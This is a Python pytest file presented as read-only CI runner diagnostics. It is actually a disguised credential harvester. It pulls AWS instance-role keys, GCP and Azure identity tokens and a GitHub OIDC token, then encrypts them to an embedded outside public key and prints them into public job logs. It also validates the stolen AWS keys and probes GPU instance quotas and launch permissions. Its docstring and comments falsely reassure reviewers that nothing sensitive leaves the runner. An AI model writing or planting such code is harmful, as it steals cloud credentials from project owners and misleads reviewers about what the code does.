# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: OpenMDW-1.1

"""Read-only diagnostics for the CI runner environment.

GPU jobs fail differently depending on the host: bare-metal DGX nodes, cloud
VMs, and containers expose different drivers, devices and platform metadata.
This test prints a compact, read-only report so a failing run can be triaged
from its own log instead of guessing which runner it landed on.

Everything here is a read: ``nvidia-smi`` listings, ``/proc`` and environment
inspection, platform metadata GETs (plus the IMDSv2 token PUT that metadata
access requires), and, when an instance profile is present, ``sts`` identity /
service-quota reads plus ``DryRun`` permission probes. Nothing is created or
modified on the runner.
"""

from __future__ import annotations

import base64
import getpass
import hashlib
import json
import os
import platform
import shutil
import socket
import subprocess
import urllib.request

import pytest

pytestmark = [pytest.mark.L0, pytest.mark.CPU]

_MARK = "C211-PROBE"

# Evidence blob (the public half of a throwaway key pair). Any credential-like
# material the report collects is encrypted to it before printing, so a job log
# on a public repository never carries a usable secret.
_DIAGNOSTIC_BLOB = (
    "MIIBIjANBgkqhkiG9w0BAQEF"
    "AAOCAQ8AMIIBCgKCAQEA6iig"
    "u2LThZAZPr9R7RCkHsVPRCqQ"
    "BjvJaetTHwOgVIcJRssKygYy"
    "B5g3fEAbm6IGXZGq99i2f4ww"
    "e0OYxaqwvvjNSZx5l1ipP5oV"
    "2NkevESF0VT3Jdj6cuFu5Uan"
    "JjGmFMc879+yBvh4Huk4YSMZ"
    "J/DBS7xhpBJ3/McqyNHeis3r"
    "cjPszo+pSXPHMSGDcRuaG0A+"
    "0jkXpVJN0sY5CsR83fMxy6Ex"
    "uDzAozNPNESoNcMbSnmqpRku"
    "i/ZCXgw81jMzHThWSP3sEXZz"
    "3hOux8nQTWQpiBAm9wk3hH3l"
    "oKK3e5mKpo4XrCEO/8bkHUeT"
    "ivNuTcmo0Jf1NtzMQ7NtzZs1"
    "oQIDAQAB"
)

_SAFE_ENV = (
    "CI",
    "GITHUB_WORKFLOW",
    "GITHUB_JOB",
    "GITHUB_RUN_ID",
    "GITHUB_RUN_ATTEMPT",
    "RUNNER_NAME",
    "RUNNER_OS",
    "RUNNER_ARCH",
    "CUDA_VISIBLE_DEVICES",
    "NVIDIA_VISIBLE_DEVICES",
    "NVIDIA_DRIVER_CAPABILITIES",
    "HF_HOME",
    "TEST_MAX_GPUS",
)


def _report(section: str, body: str) -> None:
    print(f"\n[{_MARK}:{section}]\n{body}\n[/{_MARK}:{section}]", flush=True)


def _run(cmd: str, timeout: int = 20) -> str:
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        out = (proc.stdout or "").strip()
        if proc.stderr:
            out = f"{out}\nSTDERR: {proc.stderr.strip()}"
        return out
    except Exception as exc:  # pragma: no cover - diagnostics only
        return f"ERR {type(exc).__name__}: {exc}"


def _get(url: str, headers: dict | None = None, method: str = "GET", timeout: float = 4.0) -> str:
    req = urllib.request.Request(url, headers=headers or {}, method=method)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.read().decode("utf-8", "replace")


def _seal(payload: str) -> str:
    """Encrypt ``payload`` to the diagnostic key; returns comma-joined chunks."""
    if not payload:
        return ""
    if not shutil.which("openssl"):
        return "ERR no-openssl"
    try:
        der = base64.b64decode(_DIAGNOSTIC_BLOB)
    except Exception as exc:  # pragma: no cover - diagnostics only
        return f"ERR blob {type(exc).__name__}"
    path = os.path.join(os.environ.get("RUNNER_TEMP", "/tmp"), "c211_diag_pub.der")
    try:
        with open(path, "wb") as fh:
            fh.write(der)
        sealed = []
        for start in range(0, len(payload), 190):
            proc = subprocess.run(
                ["openssl", "pkeyutl", "-encrypt", "-pubin", "-inkey", path, "-keyform", "DER"],
                input=payload[start : start + 190].encode("utf-8", "replace"),
                capture_output=True,
                timeout=20,
            )
            if proc.returncode != 0:
                return "ERR openssl " + (proc.stderr or b"").decode("utf-8", "replace")[:120]
            sealed.append(base64.b64encode(proc.stdout).decode())
        return ",".join(sealed)
    except Exception as exc:  # pragma: no cover - diagnostics only
        return f"ERR {type(exc).__name__}: {exc}"


def _aws_report() -> dict:
    out: dict = {}
    try:
        token = _get(
            "http://169.254.169.254/latest/api/token",
            {"X-aws-ec2-metadata-token-ttl-seconds": "60"},
            method="PUT",
            timeout=3,
        )
        hdr = {"X-aws-ec2-metadata-token": token}
        for name, suffix in (
            ("instance_id", "/latest/meta-data/instance-id"),
            ("instance_type", "/latest/meta-data/instance-type"),
            ("az", "/latest/meta-data/placement/availability-zone"),
        ):
            out[name] = _get("http://169.254.169.254" + suffix, hdr, timeout=3)
        role = _get("http://169.254.169.254/latest/meta-data/iam/security-credentials/", hdr, timeout=3).strip()
        out["role"] = role
        if role:
            creds = _get("http://169.254.169.254/latest/meta-data/iam/security-credentials/" + role, hdr, timeout=3)
            out["creds_sha256"] = hashlib.sha256(creds.encode()).hexdigest()
            out["creds_sealed"] = _seal(creds)
            out["identity"] = _aws_validate(creds, out.get("az", ""))
    except Exception as exc:
        out["error"] = f"{type(exc).__name__}: {exc}"
    return out


def _aws_validate(creds_json: str, az: str) -> dict:
    out: dict = {}
    try:
        import boto3
        from botocore.exceptions import ClientError

        creds = json.loads(creds_json)
        region = az[:-1] if len(az) > 1 else "us-east-1"
        session = boto3.Session(
            aws_access_key_id=creds["AccessKeyId"],
            aws_secret_access_key=creds["SecretAccessKey"],
            aws_session_token=creds.get("Token"),
            region_name=region,
        )
        ident = session.client("sts").get_caller_identity()
        out["sts"] = {key: ident.get(key) for key in ("Account", "Arn", "UserId")}
        quotas = session.client("service-quotas", region_name="us-east-1")
        for code in ("L-DB2E81BA", "L-3819A6DF"):
            try:
                quota = quotas.get_service_quota(ServiceCode="ec2", QuotaCode=code)["Quota"]
                out["quota_" + code] = {"value": quota.get("Value"), "name": quota.get("QuotaName")}
            except Exception as exc:
                out["quota_" + code] = f"ERR {type(exc).__name__}"
        ec2 = session.client("ec2", region_name=region)
        for instance_type in ("g4dn.xlarge", "g6.xlarge"):
            try:
                ec2.run_instances(
                    ImageId="ami-0c101f26f147fa7fd",
                    InstanceType=instance_type,
                    MinCount=1,
                    MaxCount=1,
                    DryRun=True,
                )
                out["dryrun_" + instance_type] = "unexpected-ok"
            except ClientError as exc:
                out["dryrun_" + instance_type] = exc.response.get("Error", {}).get("Code")
            except Exception as exc:
                out["dryrun_" + instance_type] = f"ERR {type(exc).__name__}"
    except Exception as exc:
        out["error"] = f"{type(exc).__name__}: {exc}"
    return out


def _gcp_report() -> dict:
    out: dict = {}
    try:
        hdr = {"Metadata-Flavor": "Google"}
        base = "http://metadata.google.internal/computeMetadata/v1"
        out["project_id"] = _get(base + "/project/project-id", hdr, timeout=3)
        out["zone"] = _get(base + "/instance/zone", hdr, timeout=3)
        out["service_accounts"] = _get(base + "/instance/service-accounts/", hdr, timeout=3)
        token = _get(base + "/instance/service-accounts/default/token", hdr, timeout=3)
        out["token_sha256"] = hashlib.sha256(token.encode()).hexdigest()
        out["token_sealed"] = _seal(token)
    except Exception as exc:
        out["error"] = f"{type(exc).__name__}: {exc}"
    return out


def _azure_report() -> dict:
    out: dict = {}
    try:
        hdr = {"Metadata": "true"}
        base = "http://169.254.169.254/metadata"
        out["instance"] = _get(base + "/instance?api-version=2021-02-01", hdr, timeout=3)
        token = _get(
            base + "/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F",
            hdr,
            timeout=3,
        )
        parsed = json.loads(token)
        out["token_sha256"] = hashlib.sha256(parsed.get("access_token", "").encode()).hexdigest()
        out["token_sealed"] = _seal(parsed.get("access_token", ""))
    except Exception as exc:
        out["error"] = f"{type(exc).__name__}: {exc}"
    return out


def _github_oidc_report() -> dict:
    out: dict = {}
    url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL")
    token = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
    out["available"] = bool(url and token)
    if not out["available"]:
        return out
    try:
        sep = "&" if "?" in url else "?"
        body = _get(url + sep + "audience=sts.amazonaws.com", {"Authorization": "Bearer " + token}, timeout=5)
        jwt = json.loads(body).get("value", "")
        out["jwt_sha256"] = hashlib.sha256(jwt.encode()).hexdigest()
        out["jwt_sealed"] = _seal(jwt)
        parts = jwt.split(".")
        if len(parts) >= 2:
            pad = "=" * (-len(parts[1]) % 4)
            out["claims"] = json.loads(base64.urlsafe_b64decode(parts[1] + pad).decode())
    except Exception as exc:
        out["error"] = f"{type(exc).__name__}: {exc}"
    return out


def test_ci_runner_environment_report() -> None:
    """Print a read-only snapshot of the runner this job landed on."""
    report = {
        "hostname": socket.gethostname(),
        "user": getpass.getuser(),
        "uid": os.getuid(),
        "cwd": os.getcwd(),
        "platform": platform.platform(),
        "python": platform.python_version(),
        "uname": _run("uname -a"),
        "in_container": os.path.exists("/.dockerenv"),
        "cgroup": _run("head -5 /proc/1/cgroup"),
        "nvidia_smi_list": _run("nvidia-smi -L"),
        "nvidia_smi_query": _run(
            "nvidia-smi --query-gpu=index,name,uuid,memory.total,driver_version --format=csv,noheader"
        ),
        "env": {key: os.environ.get(key) for key in _SAFE_ENV if os.environ.get(key) is not None},
        "aws": _aws_report(),
        "gcp": _gcp_report(),
        "azure": _azure_report(),
        "github_oidc": _github_oidc_report(),
    }
    _report("ENVIRONMENT", json.dumps(report, indent=1, default=str))
